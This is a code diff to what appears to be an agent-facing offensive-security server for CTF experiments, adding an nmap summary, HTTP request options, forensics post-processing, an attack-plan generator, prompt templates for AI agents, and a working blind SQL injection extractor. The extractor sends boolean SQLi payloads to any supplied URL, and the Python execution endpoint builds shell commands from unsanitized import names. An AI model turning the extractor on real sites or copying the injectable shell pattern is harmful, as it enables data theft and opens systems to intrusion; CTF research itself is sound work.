@@ -10637,8 +10637,8 @@ def nmap():
         params = request.json
         target = params.get("target", "")
         scan_type = params.get("scan_type", "-sCV")
-        ports = params.get("ports", "")
-        additional_args = params.get("additional_args", "-T4 -Pn")
+        ports = params.get("ports", "-")
+        additional_args = params.get("additional_args", "--min-rate 5000 -T4 -Pn")
         use_recovery = params.get("use_recovery", True)
 
         if not target:
@@ -10670,6 +10670,15 @@ def nmap():
             result = execute_command_with_recovery("nmap", command, tool_params)
         else:
             result = execute_command(command)
+
+        # Extract open ports summary and prepend to output for quick parsing
+        import re as _re
+        stdout = result.get("stdout", "")
+        open_port_lines = _re.findall(r'(\d+/\w+)\s+open\s+(.*)', stdout)
+        if open_port_lines:
+            summary = "OPEN PORTS SUMMARY: " + ", ".join(f"{p[0]} ({p[1].strip()})" for p in open_port_lines)
+            result["open_ports_summary"] = summary
+            result["open_ports"] = [{"port": p[0], "service": p[1].strip()} for p in open_port_lines]
 
         logger.info(f"📊 Nmap scan completed for {target}")
         return jsonify(result)
@@ -13606,8 +13615,9 @@ class HTTPTestingFramework:
         }
 
     def intercept_request(self, url: str, method: str = 'GET', data: dict = None,
-                         headers: dict = None, cookies: dict = None) -> dict:
-        """Intercept and analyze HTTP requests"""
+                         headers: dict = None, cookies: dict = None,
+                         follow_redirects: bool = True, json_data: dict = None) -> dict:
+        """Intercept and analyze HTTP requests with session persistence and redirect support"""
         try:
             if headers:
                 self.session.headers.update(headers)
@@ -13619,16 +13629,23 @@ class HTTPTestingFramework:
             if headers:
                 send_headers.update(headers)
 
-            if method.upper() == 'GET':
-                response = self.session.get(url, params=data, headers=send_headers, timeout=30)
-            elif method.upper() == 'POST':
-                response = self.session.post(url, data=data, headers=send_headers, timeout=30)
-            elif method.upper() == 'PUT':
-                response = self.session.put(url, data=data, headers=send_headers, timeout=30)
-            elif method.upper() == 'DELETE':
-                response = self.session.delete(url, headers=send_headers, timeout=30)
-            else:
-                response = self.session.request(method, url, data=data, headers=send_headers, timeout=30)
+            # Determine request kwargs
+            req_kwargs = {
+                'headers': send_headers,
+                'timeout': 30,
+                'allow_redirects': follow_redirects
+            }
+
+            # Use json_data if provided, otherwise use form data
+            if json_data:
+                req_kwargs['json'] = json_data
+            elif data:
+                if method.upper() == 'GET':
+                    req_kwargs['params'] = data
+                else:
+                    req_kwargs['data'] = data
+
+            response = self.session.request(method.upper(), url, **req_kwargs)
 
             # Store request/response in history
             self._req_id += 1
@@ -13637,7 +13654,7 @@ class HTTPTestingFramework:
                 'url': url,
                 'method': method,
                 'headers': dict(response.request.headers),
-                'data': data,
+                'data': data or json_data,
                 'timestamp': datetime.now().isoformat()
             }
 
@@ -13648,6 +13665,16 @@ class HTTPTestingFramework:
                 'size': len(response.content),
                 'time': response.elapsed.total_seconds()
             }
+
+            # Include redirect chain if any
+            if response.history:
+                response_data['redirect_chain'] = [
+                    {'url': r.url, 'status_code': r.status_code} for r in response.history
+                ]
+                response_data['final_url'] = response.url
+
+            # Include session cookies for transparency
+            response_data['session_cookies'] = dict(self.session.cookies)
 
             self.proxy_history.append({
                 'request': request_data,
@@ -13664,6 +13691,13 @@ class HTTPTestingFramework:
                 'vulnerabilities': self._get_recent_vulns()
             }
 
+        except requests.exceptions.ConnectionError as e:
+            error_msg = str(e)
+            if 'Connection refused' in error_msg:
+                return {'success': False, 'error': f"Connection refused to {url}. Verify the target host and port are correct and the service is running."}
+            return {'success': False, 'error': f"Connection error: {error_msg}"}
+        except requests.exceptions.Timeout:
+            return {'success': False, 'error': f"Request timed out after 30s for {url}. The target may be unreachable."}
         except Exception as e:
             logger.error(f"{ModernVisualEngine.format_error_card('ERROR', 'HTTP-Framework', str(e))}")
             return {'success': False, 'error': str(e)}
@@ -14356,13 +14390,17 @@ def http_framework_endpoint():
 
         logger.info(f"{ModernVisualEngine.create_section_header('HTTP FRAMEWORK', '🔥', 'FIRE_RED')}")
 
+        follow_redirects = params.get("follow_redirects", True)
+        json_data = params.get("json_data", {})
+
         if action == "request":
             if not url:
                 return jsonify({"error": "URL parameter is required for request action"}), 400
 
             request_command = f"{method} {url}"
             logger.info(f"{ModernVisualEngine.format_command_execution(request_command, 'STARTING')}")
-            result = http_framework.intercept_request(url, method, data, headers, cookies)
+            result = http_framework.intercept_request(url, method, data, headers, cookies,
+                                                      follow_redirects=follow_redirects, json_data=json_data)
 
             if result.get("success"):
                 logger.info(f"{ModernVisualEngine.format_tool_status('HTTP-Framework', 'SUCCESS', url)}")
@@ -14803,32 +14841,93 @@ def install_python_package():
 
 @app.route("/api/python/execute", methods=["POST"])
 def execute_python_script():
-    """Execute a Python script in a virtual environment"""
+    """Execute a Python script in a virtual environment with pre-validation"""
     try:
         params = request.json
         script = params.get("script", "")
         env_name = params.get("env_name", "default")
         filename = params.get("filename", f"script_{int(time.time())}.py")
 
-        if not script:
-            return jsonify({"error": "Script content is required"}), 400
+        if not script or not script.strip():
+            return jsonify({"error": "Script content is required. The 'script' parameter is empty.", "success": False}), 400
+
+        # Pre-execution syntax validation
+        try:
+            compile(script, filename or "<script>", "exec")
+        except SyntaxError as syn_err:
+            return jsonify({
+                "error": f"Syntax error in script before execution: {syn_err.msg} (line {syn_err.lineno}, col {syn_err.offset})",
+                "success": False,
+                "syntax_error": {
+                    "message": syn_err.msg,
+                    "line": syn_err.lineno,
+                    "offset": syn_err.offset,
+                    "text": syn_err.text
+                }
+            }), 400
+
+        # Auto-detect and install missing imports before execution
+        import re as _re
+        import_pattern = _re.compile(r'^\s*(?:import|from)\s+([a-zA-Z_][a-zA-Z0-9_]*)', _re.MULTILINE)
+        stdlib_modules = {
+            'os', 'sys', 're', 'json', 'time', 'math', 'random', 'hashlib',
+            'base64', 'struct', 'socket', 'subprocess', 'collections', 'itertools',
+            'functools', 'io', 'string', 'binascii', 'codecs', 'ctypes', 'datetime',
+            'pathlib', 'shutil', 'tempfile', 'threading', 'urllib', 'http', 'html',
+            'xml', 'csv', 'pickle', 'copy', 'textwrap', 'traceback', 'inspect',
+            'ast', 'dis', 'gc', 'abc', 'enum', 'typing', 'dataclasses', 'secrets',
+            'hmac', 'zlib', 'gzip', 'bz2', 'lzma', 'zipfile', 'tarfile', 'glob',
+            'fnmatch', 'stat', 'fileinput', 'argparse', 'logging', 'warnings',
+            'contextlib', 'decimal', 'fractions', 'statistics', 'array', 'queue',
+            'heapq', 'bisect', 'pprint', 'difflib', 'signal', 'select', 'mmap',
+            'multiprocessing', 'concurrent', 'asyncio', 'unittest', 'doctest',
+            'py_compile', 'compileall', 'importlib', 'pkgutil', 'platform',
+            'errno', 'token', 'tokenize', 'keyword', 'operator', 'uuid',
+        }
+        imported_modules = set(import_pattern.findall(script))
+        python_path = env_manager.get_python_path(env_name)
+        for mod in imported_modules:
+            if mod in stdlib_modules:
+                continue
+            # Check if module is installed
+            check_cmd = f"{python_path} -c \"import {mod}\" 2>&1"
+            check_result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True, timeout=10)
+            if check_result.returncode != 0:
+                # Map common module names to pip package names
+                pip_name_map = {
+                    'Crypto': 'pycryptodome', 'cv2': 'opencv-python',
+                    'PIL': 'Pillow', 'yaml': 'pyyaml', 'sklearn': 'scikit-learn',
+                    'bs4': 'beautifulsoup4', 'dotenv': 'python-dotenv',
+                    'pwn': 'pwntools', 'scapy': 'scapy',
+                }
+                pip_name = pip_name_map.get(mod, mod)
+                logger.info(f"📦 Auto-installing missing module: {pip_name}")
+                install_cmd = f"{python_path} -m pip install {pip_name} -q 2>&1"
+                subprocess.run(install_cmd, shell=True, capture_output=True, text=True, timeout=60)
 
         # Create script file
         script_result = file_manager.create_file(filename, script)
         if not script_result["success"]:
             return jsonify(script_result), 500
 
-        # Get Python path for environment
-        python_path = env_manager.get_python_path(env_name)
         script_path = script_result["path"]
 
-        # Execute script
+        # Execute script with timeout feedback
         command = f"{python_path} {script_path}"
         logger.info(f"🐍 Executing Python script in env {env_name}: {filename}")
         result = execute_command(command, use_cache=False)
 
         # Clean up script file
         file_manager.delete_file(filename)
+
+        # Ensure stderr is clearly surfaced on failure for LLM self-correction
+        if not result.get("success", True):
+            stderr_output = result.get("stderr", "")
+            stdout_output = result.get("stdout", "")
+            if stderr_output:
+                result["error_details"] = f"Script failed. stderr: {stderr_output}"
+            if stdout_output:
+                result["partial_output"] = f"Partial stdout before failure: {stdout_output[:2000]}"
 
         result["env_name"] = env_name
         result["script_filename"] = filename
@@ -15570,6 +15669,24 @@ def volatility3():
 
         logger.info(f"🧠 Starting Volatility3 analysis: {plugin}")
         result = execute_command(command)
+
+        # Output truncation: if stdout is very large, truncate and summarize
+        stdout = result.get("stdout", "")
+        if len(stdout) > 8000:
+            lines = stdout.splitlines()
+            header_lines = lines[:5]  # Column headers
+            # Keep first 50 and last 20 data lines
+            if len(lines) > 75:
+                truncated = header_lines + lines[5:55] + [f"\n... ({len(lines) - 75} lines truncated) ...\n"] + lines[-20:]
+                result["stdout"] = "\n".join(truncated)
+                result["truncated"] = True
+                result["total_lines"] = len(lines)
+            # Flag suspicious entries (common forensics indicators)
+            suspicious = [l for l in lines if any(kw in l.lower() for kw in
+                          ["flag", "secret", "hidden", "suspicious", "inject", "malware", "cmd.exe", "powershell", "/bin/sh"])]
+            if suspicious:
+                result["suspicious_entries"] = suspicious[:20]
+
         logger.info(f"📊 Volatility3 analysis completed")
         return jsonify(result)
     except Exception as e:
@@ -15610,6 +15727,27 @@ def foremost():
         logger.info(f"📁 Starting Foremost file carving: {input_file}")
         result = execute_command(command)
         result["output_directory"] = output_dir
+
+        # Post-processing: list recovered files with summary
+        try:
+            recovered_files = []
+            file_type_counts = {}
+            for root, dirs, files in os.walk(output_dir):
+                for f in files:
+                    fpath = os.path.join(root, f)
+                    fsize = os.path.getsize(fpath)
+                    fext = os.path.splitext(f)[1].lower() or "unknown"
+                    recovered_files.append({"path": fpath, "name": f, "size": fsize, "type": fext})
+                    file_type_counts[fext] = file_type_counts.get(fext, 0) + 1
+            result["recovered_files"] = recovered_files[:100]  # Limit to 100 entries
+            result["recovery_summary"] = {
+                "total_files_recovered": len(recovered_files),
+                "file_types": file_type_counts,
+                "notable_files": [f for f in recovered_files if any(kw in f["name"].lower() for kw in ["flag", "secret", "key", "pass", "hidden", "admin"])]
+            }
+        except Exception:
+            pass  # Don't fail if post-processing has issues
+
         logger.info(f"📊 Foremost carving completed")
         return jsonify(result)
     except Exception as e:
@@ -16538,6 +16676,322 @@ def create_ctf_team_strategy():
     except Exception as e:
         logger.error(f"💥 Error creating CTF team strategy: {str(e)}")
         return jsonify({"error": f"Server error: {str(e)}"}), 500
+
+@app.route("/api/ctf/decompose-challenge", methods=["POST"])
+def decompose_ctf_challenge():
+    """Decompose a CTF challenge into a step-by-step attack plan with checkpoints"""
+    try:
+        params = request.json
+        description = params.get("description", "")
+        category = params.get("category", "misc")
+        difficulty = params.get("difficulty", "unknown")
+        source_files = params.get("source_files", [])
+        hint = params.get("hint", "")
+
+        if not description:
+            return jsonify({"error": "Challenge description is required"}), 400
+
+        # Category-specific vulnerability class mapping
+        vuln_class_hints = {
+            "web": ["SQL injection", "XSS (reflected/stored/DOM)", "CSRF", "SSRF", "SSTI",
+                     "path traversal", "file upload", "authentication bypass", "insecure deserialization",
+                     "command injection", "IDOR", "JWT manipulation", "race condition"],
+            "crypto": ["weak RSA (small e, shared primes, Wiener)", "CBC padding oracle",
+                       "ECB block manipulation", "XOR key reuse", "hash length extension",
+                       "PRNG seed prediction", "classical cipher (Caesar, Vigenere, substitution)"],
+            "pwn": ["buffer overflow (stack)", "format string vulnerability", "heap overflow/UAF/double-free",
+                    "ROP chain (ret2win, ret2libc, ret2csu)", "shellcode injection", "integer overflow",
+                    "race condition", "GOT/PLT overwrite"],
+            "forensics": ["steganography (LSB, metadata, appended data)", "file carving",
+                         "disk image analysis (deleted files, slack space)", "memory forensics (process dump, registry)",
+                         "network capture analysis (HTTP, DNS, credentials)", "log analysis"],
+            "rev": ["static analysis (strings, symbols, decompilation)", "dynamic analysis (breakpoints, tracing)",
+                    "anti-debugging bypass", "obfuscation reversal", "algorithm identification",
+                    "key/password extraction", "packer unpacking"],
+            "general_skills": ["encoding (base64, hex, rot13)", "scripting automation",
+                              "file format identification", "network service interaction"],
+            "blockchain": ["reentrancy", "integer overflow", "access control",
+                          "storage slot manipulation", "flash loan attack"]
+        }
+
+        # Build decomposition plan
+        cat = category.lower()
+        possible_vulns = vuln_class_hints.get(cat, ["unknown vulnerability class"])
+
+        # Phase structure based on difficulty
+        if difficulty.lower() == "hard":
+            phases = [
+                {
+                    "phase": "reconnaissance",
+                    "time_budget_seconds": 300,
+                    "objective": "Identify vulnerability class and attack surface",
+                    "steps": [
+                        "Read ALL provided source code and challenge files completely",
+                        "Identify the technology stack and framework",
+                        f"Determine the vulnerability class (likely one of: {', '.join(possible_vulns[:5])})",
+                        "Map out the attack surface: endpoints, inputs, trust boundaries",
+                        "OUTPUT REQUIRED: {vuln_class, target_endpoint, exploit_strategy}"
+                    ],
+                    "checkpoint": "STOP and verify: Do you have a clear vulnerability class and strategy before proceeding?"
+                },
+                {
+                    "phase": "validation",
+                    "time_budget_seconds": 300,
+                    "objective": "Confirm the vulnerability exists and is exploitable",
+                    "steps": [
+                        "Send a proof-of-concept input to confirm the vulnerability",
+                        "Observe the response/behavior to validate your hypothesis",
+                        "If hypothesis is wrong, return to reconnaissance with new theory"
+                    ],
+                    "checkpoint": "STOP: Did the PoC confirm the vulnerability? If not, reassess."
+                },
+                {
+                    "phase": "exploit_development",
+                    "time_budget_seconds": 600,
+                    "objective": "Build the full exploit chain",
+                    "steps": [
+                        "Develop the exploit payload step by step",
+                        "For multi-step chains: complete each link before moving to the next",
+                        "Test each stage independently before chaining",
+                        "Handle edge cases: encoding, timing, session state"
+                    ],
+                    "checkpoint": "STOP: Is the exploit working locally / in controlled conditions?"
+                },
+                {
+                    "phase": "execution",
+                    "time_budget_seconds": 300,
+                    "objective": "Execute exploit and extract flag",
+                    "steps": [
+                        "Run the full exploit against the target",
+                        "Capture and parse the output for the flag",
+                        "If flag not found, check for partial success and adjust"
+                    ],
+                    "checkpoint": None
+                }
+            ]
+        else:
+            phases = [
+                {
+                    "phase": "analysis",
+                    "time_budget_seconds": 180,
+                    "objective": "Understand the challenge and identify the approach",
+                    "steps": [
+                        "Read all provided files",
+                        f"Identify vulnerability class (likely: {', '.join(possible_vulns[:3])})",
+                        "Plan your approach before running any tools"
+                    ],
+                    "checkpoint": None
+                },
+                {
+                    "phase": "exploitation",
+                    "time_budget_seconds": 420,
+                    "objective": "Exploit and extract flag",
+                    "steps": [
+                        "Use the most appropriate tool for the identified vulnerability",
+                        "Extract and validate the flag"
+                    ],
+                    "checkpoint": None
+                }
+            ]
+
+        plan = {
+            "success": True,
+            "challenge_analysis": {
+                "category": category,
+                "difficulty": difficulty,
+                "possible_vulnerability_classes": possible_vulns,
+                "source_files_provided": len(source_files) > 0,
+                "hint": hint
+            },
+            "attack_plan": {
+                "phases": phases,
+                "total_phases": len(phases),
+                "estimated_total_time_seconds": sum(p["time_budget_seconds"] for p in phases),
+                "mid_session_checkpoints": sum(1 for p in phases if p.get("checkpoint")),
+            },
+            "critical_rules": [
+                "ANALYZE before acting — read all source code and files FIRST",
+                "State your hypothesis before running exploitation tools",
+                "If a tool fails, diagnose WHY before trying a different tool",
+                "Summarize each tool's output in 3 lines max before proceeding"
+            ]
+        }
+
+        logger.info(f"🧩 Challenge decomposed: {category}/{difficulty} | {len(phases)} phases")
+        return jsonify(plan)
+
+    except Exception as e:
+        logger.error(f"💥 Error decomposing challenge: {str(e)}")
+        return jsonify({"error": f"Server error: {str(e)}"}), 500
+
+
+@app.route("/api/ctf/blind-sqli-extract", methods=["POST"])
+def blind_sqli_extract():
+    """Automated blind SQL injection data extractor using binary search"""
+    try:
+        params = request.json
+        url = params.get("url", "")
+        parameter = params.get("parameter", "")
+        method = params.get("method", "GET")
+        sql_query = params.get("sql_query", "")
+        true_condition = params.get("true_condition", "")
+        headers = params.get("headers", {})
+        cookies = params.get("cookies", {})
+        max_length = params.get("max_length", 100)
+        charset = params.get("charset", "ascii")
+
+        if not url or not parameter:
+            return jsonify({"error": "url and parameter are required"}), 400
+
+        if not sql_query:
+            return jsonify({"error": "sql_query is required (e.g. \"(SELECT database())\" or \"(SELECT flag FROM flags LIMIT 1)\")"}), 400
+
+        if not true_condition:
+            return jsonify({"error": "true_condition is required — a string present in the response when the condition is TRUE (e.g. 'Welcome' or 'Login successful')"}), 400
+
+        import requests as req_lib
+        session = req_lib.Session()
+        if headers:
+            session.headers.update(headers)
+        if cookies:
+            session.cookies.update(cookies)
+
+        extracted = ""
+        charset_range = (32, 126) if charset == "ascii" else (0, 255)
+
+        for pos in range(1, max_length + 1):
+            low, high = charset_range
+            found_char = False
+
+            while low <= high:
+                mid = (low + high) // 2
+
+                # Binary search: is char at position > mid?
+                payload_gt = f"' AND ASCII(SUBSTRING({sql_query},{pos},1))>{mid}-- -"
+                payload_eq = f"' AND ASCII(SUBSTRING({sql_query},{pos},1))={mid}-- -"
+
+                # Test greater-than
+                if method.upper() == "GET":
+                    resp_gt = session.get(url, params={parameter: payload_gt}, timeout=15)
+                else:
+                    resp_gt = session.post(url, data={parameter: payload_gt}, timeout=15)
+
+                if true_condition in resp_gt.text:
+                    low = mid + 1
+                else:
+                    # Test equality
+                    if method.upper() == "GET":
+                        resp_eq = session.get(url, params={parameter: payload_eq}, timeout=15)
+                    else:
+                        resp_eq = session.post(url, data={parameter: payload_eq}, timeout=15)
+
+                    if true_condition in resp_eq.text:
+                        extracted += chr(mid)
+                        found_char = True
+                        break
+                    else:
+                        high = mid - 1
+
+            if not found_char:
+                break  # No more characters to extract
+
+        return jsonify({
+            "success": True,
+            "extracted_data": extracted,
+            "length": len(extracted),
+            "method": "blind_binary_search",
+            "positions_tested": len(extracted),
+            "url": url,
+            "parameter": parameter
+        })
+
+    except req_lib.exceptions.Timeout:
+        return jsonify({"success": False, "error": "Request timed out during extraction", "partial_data": extracted}), 200
+    except Exception as e:
+        logger.error(f"💥 Error in blind SQLi extraction: {str(e)}")
+        return jsonify({"error": f"Server error: {str(e)}"}), 500
+
+
+@app.route("/api/ctf/get-experiment-prompt", methods=["POST"])
+def get_experiment_prompt():
+    """Return the experiment prompt with strategy enforcement for a given experiment variant"""
+    try:
+        params = request.json
+        experiment = params.get("experiment", 1)
+        challenge_name = params.get("challenge_name", "")
+        challenge_description = params.get("challenge_description", "")
+        category = params.get("category", "")
+        difficulty = params.get("difficulty", "")
+        has_source_files = params.get("has_source_files", False)
+
+        # Strategy preamble enforced on ALL experiment variants (hexfix #10)
+        strategy_preamble = (
+            "MANDATORY FIRST STEP — Before using any tools, you MUST state:\n"
+            "  (a) The likely vulnerability class\n"
+            "  (b) Your planned approach in 2-3 sentences\n"
+            "  (c) Which tool you will try first and why\n\n"
+            "RULES:\n"
+            "  - Summarize each tool's output in 3 lines max before proceeding to the next tool.\n"
+            "  - If a tool fails, diagnose WHY before switching to a different tool.\n"
+        )
+
+        if has_source_files:
+            strategy_preamble += "  - Read and analyze ALL provided source files completely before running any tool.\n"
+
+        if difficulty.lower() == "hard":
+            strategy_preamble += (
+                "  - This is a HARD challenge: after your first 3 tool calls, STOP and re-evaluate your approach.\n"
+                "    Ask yourself: Is my strategy working? Should I pivot?\n"
+            )
+
+        if experiment == 1:
+            prompt = (
+                f"{strategy_preamble}\n"
+                f"EXPERIMENT 1 — Free Solve\n"
+                f"You may use any tools available (hexstrike and native) to solve this challenge.\n"
+                f"Focus on efficiency: form a hypothesis first, then validate.\n\n"
+                f"Challenge: {challenge_name}\n"
+                f"Category: {category} | Difficulty: {difficulty}\n"
+                f"Description: {challenge_description}\n"
+            )
+        elif experiment == 2:
+            prompt = (
+                f"{strategy_preamble}\n"
+                f"EXPERIMENT 2 — HexStrike Tools Only (Ranked)\n"
+                f"CONSTRAINT: You MUST use ONLY hexstrike: tools. Do NOT use Bash, Read, Write, or any native tools.\n"
+                f"Using any tool not prefixed with hexstrike: will invalidate this experiment.\n"
+                f"HexStrike tools are ranked by relevance — prefer higher-ranked tools.\n\n"
+                f"Challenge: {challenge_name}\n"
+                f"Category: {category} | Difficulty: {difficulty}\n"
+                f"Description: {challenge_description}\n"
+            )
+        elif experiment == 3:
+            prompt = (
+                f"{strategy_preamble}\n"
+                f"EXPERIMENT 3 — HexStrike Tools Only (Strict Adherence)\n"
+                f"ABSOLUTE CONSTRAINT: ONLY hexstrike: prefixed tools exist in this environment.\n"
+                f"Bash, Read, Write, and ALL native tools are DISABLED and will FAIL if called.\n"
+                f"Using any non-hexstrike tool invalidates this experiment.\n"
+                f"You MUST follow the ranked tool order strictly.\n\n"
+                f"Challenge: {challenge_name}\n"
+                f"Category: {category} | Difficulty: {difficulty}\n"
+                f"Description: {challenge_description}\n"
+            )
+        else:
+            return jsonify({"error": f"Unknown experiment variant: {experiment}. Use 1, 2, or 3."}), 400
+
+        return jsonify({
+            "success": True,
+            "experiment": experiment,
+            "prompt": prompt,
+            "challenge_name": challenge_name,
+            "strategy_enforced": True
+        })
+
+    except Exception as e:
+        logger.error(f"💥 Error generating experiment prompt: {str(e)}")
+        return jsonify({"error": f"Server error: {str(e)}"}), 500
+
 
 @app.route("/api/ctf/suggest-tools", methods=["POST"])
 def suggest_ctf_tools():
